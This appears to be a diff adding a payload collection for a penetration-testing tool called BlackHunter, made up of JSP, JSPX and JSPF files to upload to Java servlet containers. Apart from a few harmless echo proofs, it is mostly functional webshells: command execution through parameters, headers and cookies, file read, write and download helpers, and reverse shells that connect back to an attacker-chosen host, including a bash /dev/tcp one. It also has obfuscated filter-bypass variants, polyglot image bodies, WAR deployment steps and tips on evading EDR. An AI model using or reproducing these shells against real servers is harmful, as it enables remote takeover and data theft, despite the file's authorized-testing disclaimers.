@@ -1,0 +1,672 @@
+# ============================================================
+# BlackHunter — Upload Payloads: JSP / Java Shells
+# ============================================================
+# Purpose : Verify whether an uploaded JSP/JSPX/JSPF file
+#           executes on the target Java servlet container.
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : Each entry is a block delimited by [name] ... [/name].
+#           The "filename" directive sets the recommended name.
+#           The body between ---BEGIN--- and ---END--- is the
+#           exact file content to write to disk.
+# Warning : These are functional webshells. On an authorized
+#           engagement, prefer the harmless proof payloads
+#           (jsp_proof_echo, jsp_proof_math) to confirm
+#           execution. Only upload a command shell if the RoE
+#           explicitly allows it, and remove it before the
+#           engagement ends.
+# ============================================================
+
+
+# ------------------------------------------------------------
+# 1. Harmless proof-of-execution (PREFERRED)
+# ------------------------------------------------------------
+[jsp_proof_echo]
+filename: proof.jsp
+---BEGIN---
+<%= "BLACKHUNTER_UPLOAD_OK" %>
+---END---
+[/jsp_proof_echo]
+
+[jsp_proof_math]
+filename: calc.jsp
+---BEGIN---
+<%= 7*191 /* 1337 */ %>
+---END---
+[/jsp_proof_math]
+
+[jsp_proof_sysinfo]
+filename: sysinfo.jsp
+---BEGIN---
+<%= System.getProperty("os.name") + " / " + System.getProperty("java.version") %>
+---END---
+[/jsp_proof_sysinfo]
+
+[jsp_proof_header]
+filename: hdr.jsp
+---BEGIN---
+<%@ page import="java.util.*" %><%= new Date() %>
+---END---
+[/jsp_proof_header]
+
+
+# ------------------------------------------------------------
+# 2. Minimal command execution (GET parameter)
+# ------------------------------------------------------------
+[jsp_cmd_get_runtime]
+filename: cmd.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(c);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_get_runtime]
+
+[jsp_cmd_get_runtime_full]
+filename: cmd2.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+    while ((l = er.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_get_runtime_full]
+
+[jsp_cmd_get_processbuilder]
+filename: cmd3.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",c);
+    pb.redirectErrorStream(true);
+    Process p = pb.start();
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_get_processbuilder]
+
+[jsp_cmd_get_windows]
+filename: cmdwin.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_get_windows]
+
+
+# ------------------------------------------------------------
+# 3. POST-based / header-based command execution
+# ------------------------------------------------------------
+[jsp_cmd_post]
+filename: cmdp.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c == null) c = request.getReader().readLine();
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_post]
+
+[jsp_cmd_header]
+filename: cmdh.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getHeader("X-Command");
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_header]
+
+[jsp_cmd_cookie]
+filename: cmdc.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = null;
+  Cookie[] cs = request.getCookies();
+  if (cs != null) for (Cookie k : cs) if (k.getName().equals("c")) c = k.getValue();
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_cookie]
+
+
+# ------------------------------------------------------------
+# 4. Reflection / classloader variants (bypass naive filters)
+# ------------------------------------------------------------
+[jsp_cmd_reflection]
+filename: cmdrefl.jsp
+---BEGIN---
+<%@ page import="java.lang.reflect.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    Class<?> rt = Class.forName("java.lang.Runtime");
+    Method get  = rt.getMethod("getRuntime");
+    Object r    = get.invoke(null);
+    Method ex   = rt.getMethod("exec", String.class);
+    Process p   = (Process) ex.invoke(r, new String[]{"/bin/sh","-c",c});
+    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jsp_cmd_reflection]
+
+[jsp_cmd_scriptengine]
+filename: cmdnashorn.jsp
+---BEGIN---
+<%@ page import="javax.script.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    ScriptEngineManager m = new ScriptEngineManager();
+    ScriptEngine e = m.getEngineByName("js");
+    if (e != null) out.println(e.eval(c));
+    else out.println("NO_SCRIPT_ENGINE");
+  }
+%>
+---END---
+[/jsp_cmd_scriptengine]
+
+[jsp_cmd_el]
+filename: cmdel.jsp
+---BEGIN---
+<%@ page isELIgnored="false" %>
+${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
+---END---
+[/jsp_cmd_el]
+
+
+# ------------------------------------------------------------
+# 5. File manager / read / write helpers
+# ------------------------------------------------------------
+[jsp_file_read]
+filename: read.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.nio.file.*" %>
+<%
+  String f = request.getParameter("f");
+  if (f != null) out.println(new String(Files.readAllBytes(Paths.get(f))));
+%>
+---END---
+[/jsp_file_read]
+
+[jsp_file_read_b64]
+filename: readb64.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.util.*,java.nio.file.*" %>
+<%
+  String f = request.getParameter("f");
+  if (f != null) {
+    byte[] b = Files.readAllBytes(Paths.get(f));
+    out.println(Base64.getEncoder().encodeToString(b));
+  }
+%>
+---END---
+[/jsp_file_read_b64]
+
+[jsp_file_write]
+filename: write.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.nio.file.*" %>
+<%
+  String f = request.getParameter("f");
+  String d = request.getParameter("d");
+  if (f != null && d != null) {
+    Files.write(Paths.get(f), d.getBytes());
+    out.println("WROTE");
+  }
+%>
+---END---
+[/jsp_file_write]
+
+[jsp_file_upload]
+filename: up.jsp
+---BEGIN---
+<%@ page import="java.io.*,javax.servlet.http.*,javax.servlet.annotation.*" %>
+<%
+  // Requires multipart config on the page or container
+  Part p = request.getPart("f");
+  if (p != null) {
+    String name = p.getSubmittedFileName();
+    FileOutputStream fos = new FileOutputStream("/tmp/" + name);
+    InputStream is = p.getInputStream();
+    byte[] buf = new byte[4096]; int n;
+    while ((n = is.read(buf)) != -1) fos.write(buf, 0, n);
+    fos.close(); is.close();
+    out.println("UP:" + name);
+  }
+%>
+---END---
+[/jsp_file_upload]
+
+[jsp_file_list]
+filename: ls.jsp
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String d = request.getParameter("d");
+  if (d == null) d = ".";
+  File[] fs = new File(d).listFiles();
+  if (fs != null) for (File x : fs) out.println(x.getAbsolutePath());
+%>
+---END---
+[/jsp_file_list]
+
+[jsp_file_download]
+filename: dl.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.nio.file.*" %>
+<%
+  String f = request.getParameter("f");
+  if (f != null) {
+    File file = new File(f);
+    response.setContentType("application/octet-stream");
+    response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
+    Files.copy(file.toPath(), response.getOutputStream());
+  }
+%>
+---END---
+[/jsp_file_download]
+
+
+# ------------------------------------------------------------
+# 6. Reverse shell (JSP) — TCP back to attacker
+# ------------------------------------------------------------
+[jsp_revshell]
+filename: rev.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.net.*" %>
+<%
+  String host = request.getParameter("h");
+  String port = request.getParameter("p");
+  if (host != null && port != null) {
+    Socket s = new Socket(host, Integer.parseInt(port));
+    Process proc = Runtime.getRuntime().exec(new String[]{"/bin/sh","-i"});
+    new Thread(() -> {
+      try {
+        InputStream in = proc.getInputStream();
+        OutputStream outS = s.getOutputStream();
+        byte[] b = new byte[1024]; int n;
+        while ((n = in.read(b)) != -1) outS.write(b, 0, n);
+      } catch (Exception e) {}
+    }).start();
+    new Thread(() -> {
+      try {
+        InputStream in = s.getInputStream();
+        OutputStream outS = proc.getOutputStream();
+        byte[] b = new byte[1024]; int n;
+        while ((n = in.read(b)) != -1) outS.write(b, 0, n);
+      } catch (Exception e) {}
+    }).start();
+    out.println("CONNECTED");
+  }
+%>
+---END---
+[/jsp_revshell]
+
+[jsp_revshell_bash]
+filename: revb.jsp
+---BEGIN---
+<%@ page import="java.io.*,java.net.*" %>
+<%
+  String host = request.getParameter("h");
+  String port = request.getParameter("p");
+  if (host != null && port != null) {
+    Socket s = new Socket(host, Integer.parseInt(port));
+    Process proc = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"});
+    out.println("SENT");
+  }
+%>
+---END---
+[/jsp_revshell_bash]
+
+
+# ------------------------------------------------------------
+# 7. Info / recon (what can this shell do?)
+# ------------------------------------------------------------
+[jsp_recon]
+filename: recon.jsp
+---BEGIN---
+<%@ page import="java.util.*,java.io.*" %>
+<%
+  out.println("OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version"));
+  out.println("ARCH: " + System.getProperty("os.arch"));
+  out.println("USER: " + System.getProperty("user.name"));
+  out.println("HOME: " + System.getProperty("user.home"));
+  out.println("CWD: " + System.getProperty("user.dir"));
+  out.println("JAVA: " + System.getProperty("java.version"));
+  out.println("VENDOR: " + System.getProperty("java.vendor"));
+  out.println("JAVA_HOME: " + System.getProperty("java.home"));
+  out.println("CLASSPATH: " + System.getProperty("java.class.path"));
+  out.println("TMPDIR: " + System.getProperty("java.io.tmpdir"));
+  out.println("SERVER: " + application.getServerInfo());
+  out.println("SERVLET: " + application.getMajorVersion() + "." + application.getMinorVersion());
+  out.println("SESSION: " + session.getId());
+  out.println("DOCROOT: " + application.getRealPath("/"));
+  out.println("ENV: " + System.getenv());
+%>
+---END---
+[/jsp_recon]
+
+
+# ------------------------------------------------------------
+# 8. Short / minimised shells (WAF / length bypass)
+# ------------------------------------------------------------
+[jsp_short_expression]
+filename: s.jsp
+---BEGIN---
+<%=Runtime.getRuntime().exec(request.getParameter("c"))%>
+---END---
+[/jsp_short_expression]
+
+[jsp_short_scriptlet]
+filename: s2.jsp
+---BEGIN---
+<%Runtime.getRuntime().exec(request.getParameter("c"));%>
+---END---
+[/jsp_short_scriptlet]
+
+[jsp_short_processbuilder]
+filename: s3.jsp
+---BEGIN---
+<%new ProcessBuilder(request.getParameter("c")).start();%>
+---END---
+[/jsp_short_processbuilder]
+
+[jsp_short_el]
+filename: s4.jsp
+---BEGIN---
+${pageContext.request.getSession().setAttribute("a",pageContext.request.getParameter("c"))}
+---END---
+[/jsp_short_el]
+
+
+# ------------------------------------------------------------
+# 9. Obfuscated / WAF-bypass variants
+# ------------------------------------------------------------
+[jsp_obf_concat]
+filename: o1.jsp
+---BEGIN---
+<%
+  String a = "java.lang.Run";
+  String b = "time";
+  Class<?> c = Class.forName(a + b);
+  java.lang.reflect.Method m = c.getMethod("getRuntime");
+  Object r = m.invoke(null);
+  c.getMethod("exec", String.class).invoke(r, request.getParameter("c"));
+%>
+---END---
+[/jsp_obf_concat]
+
+[jsp_obf_base64]
+filename: o2.jsp
+---BEGIN---
+<%@ page import="java.util.*,java.lang.reflect.*" %>
+<%
+  String b64 = request.getParameter("c");
+  String code = new String(Base64.getDecoder().decode(b64));
+  Class<?> c = Class.forName("java.lang.Runtime");
+  Method get = c.getMethod("getRuntime");
+  Object r = get.invoke(null);
+  c.getMethod("exec", String.class).invoke(r, new String[]{"/bin/sh","-c",code});
+%>
+---END---
+[/jsp_obf_base64]
+
+[jsp_obf_charcode]
+filename: o3.jsp
+---BEGIN---
+<%
+  String s = new String(new char[]{'j','a','v','a','.','l','a','n','g','.','R','u','n','t','i','m','e'});
+  Class<?> c = Class.forName(s);
+  Object r = c.getMethod("getRuntime").invoke(null);
+  c.getMethod("exec", String.class).invoke(r, request.getParameter("c"));
+%>
+---END---
+[/jsp_obf_charcode]
+
+[jsp_obf_unicode]
+filename: o4.jsp
+---BEGIN---
+<%\u0052untime.getRuntime().exec(request.getParameter("c"));%>
+---END---
+[/jsp_obf_unicode]
+
+[jsp_obf_scriptengine]
+filename: o5.jsp
+---BEGIN---
+<%@ page import="javax.script.*" %>
+<%
+  ScriptEngine e = new ScriptEngineManager().getEngineByName("nashorn");
+  if (e == null) e = new ScriptEngineManager().getEngineByName("js");
+  if (e != null) e.eval("java.lang.Runtime.getRuntime().exec('" + request.getParameter("c") + "')");
+%>
+---END---
+[/jsp_obf_scriptengine]
+
+[jsp_obf_el_inject]
+filename: o6.jsp
+---BEGIN---
+<%@ page isELIgnored="false" %>
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")}
+---END---
+[/jsp_obf_el_inject]
+
+
+# ------------------------------------------------------------
+# 10. JSPX (XML-based) variants — bypass some filters
+# ------------------------------------------------------------
+[jspx_proof]
+filename: proof.jspx
+---BEGIN---
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+  <jsp:directive.page contentType="text/html"/>
+  <jsp:text>BLACKHUNTER_UPLOAD_OK</jsp:text>
+</jsp:root>
+---END---
+[/jspx_proof]
+
+[jspx_cmd]
+filename: cmd.jspx
+---BEGIN---
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+  <jsp:directive.page import="java.io.*"/>
+  <jsp:scriptlet>
+    String c = request.getParameter("c");
+    if (c != null) {
+      Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+      String l;
+      while ((l = br.readLine()) != null) { out.println(l); }
+    }
+  </jsp:scriptlet>
+</jsp:root>
+---END---
+[/jspx_cmd]
+
+
+# ------------------------------------------------------------
+# 11. JSPF (fragment) — often missed by upload filters
+# ------------------------------------------------------------
+[jspf_cmd]
+filename: cmd.jspf
+---BEGIN---
+<%@ page import="java.io.*" %>
+<%
+  String c = request.getParameter("c");
+  if (c != null) {
+    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String l;
+    while ((l = br.readLine()) != null) { out.println(l); }
+  }
+%>
+---END---
+[/jspf_cmd]
+
+
+# ------------------------------------------------------------
+# 12. Polyglot / extension-bypass bodies
+#    (pair with extensions.txt and mime_types.txt)
+# ------------------------------------------------------------
+[jsp_bypass_gif]
+filename: shell.jsp.gif
+---BEGIN---
+GIF89a
+<%= "BLACKHUNTER_UPLOAD_OK" %>
+---END---
+[/jsp_bypass_gif]
+
+[jsp_bypass_png]
+filename: shell.jsp.png
+---BEGIN---
+\x89PNG\r\n\x1a\n
+<%= "BLACKHUNTER_UPLOAD_OK" %>
+---END---
+[/jsp_bypass_png]
+
+[jsp_bypass_jpg]
+filename: shell.jsp.jpg
+---BEGIN---
+\xff\xd8\xff\xe0
+<%= "BLACKHUNTER_UPLOAD_OK" %>
+---END---
+[/jsp_bypass_jpg]
+
+[jsp_bypass_zip]
+filename: shell.jsp.zip
+---BEGIN---
+PK\x03\x04
+<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("c")); %>
+---END---
+[/jsp_bypass_zip]
+
+
+# ------------------------------------------------------------
+# 13. WAR / EAR / JAR deployment payloads
+#    (for Tomcat manager, JBoss, WildFly, WebLogic)
+# ------------------------------------------------------------
+[war_deploy_note]
+filename: README-war.txt
+---BEGIN---
+A .war file is a ZIP archive with the following layout:
+
+  shell.war
+  ├── WEB-INF/
+  │   ├── web.xml
+  │   └── classes/
+  └── shell.jsp
+
+web.xml contents:
+
+  <?xml version="1.0" encoding="UTF-8"?>
+  <web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
+    <servlet>
+      <servlet-name>shell</servlet-name>
+      <jsp-file>/shell.jsp</jsp-file>
+    </servlet>
+    <servlet-mapping>
+      <servlet-name>shell</servlet-name>
+      <url-pattern>/shell</url-pattern>
+    </servlet-mapping>
+  </web-app>
+
+Deploy via:
+  - Tomcat Manager  : PUT /manager/deploy?path=/shell
+  - JBoss/WildFly   : admin console or CLI
+  - WebLogic        : admin console
+Once deployed, access at: /shell/shell.jsp?c=id
+---END---
+[/war_deploy_note]
+
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. Confirm execution BEFORE uploading a real shell.
+#    Upload proof.jsp, request it, and look for the literal
+#    string "BLACKHUNTER_UPLOAD_OK". If you don't see it, the
+#    file was uploaded but not executed — move on to bypass
+#    techniques (extensions.txt, mime_types.txt, JSPX/JSPF).
+#
+# 2. Compilation is lazy. Tomcat compiles JSPs on first request.
+#    If a JSP contains a syntax error, you'll get a 500 with
+#    the compiler message — useful for confirming execution
+#    even when the payload is broken.
+#
+# 3. Common upload paths on Java stacks:
+#    - Tomcat  : /manager/html  (deploy WAR), /examples/
+#    - JBoss   : /jmx-console/, /web-console/
+#    - WildFly : /management/
+#    - WebLogic: /console/
+#    Upload a .war rather than a .jsp when the manager is
+#    reachable — it's more reliable than path-based uploads.
+#
+# 4. JSPX (XML syntax) and JSPF (fragment) are often missed by
+#    filters that only block ".jsp". Try them after .jsp fails.
+#
+# 5. Expression Language (EL) injection works on older
+#    containers and is a good WAF bypass when scriptlets are
+#    blocked.
+#
+# 6. Nashorn (js engine) was removed in JDK 15. Test for it,
+#    but don't rely on it on modern targets.
+#
+# 7. Do NOT leave a shell behind. Delete it before the
+#    engagement ends, and document the exact path + hash in
+#    the report as evidence of the finding.
+#
+# 8. Reverse shells from a Java process can be detected by EDR
+#    faster than HTTP-based webshells. Prefer the HTTP shell
+#    unless the RoE allows interactive access.
+# ============================================================
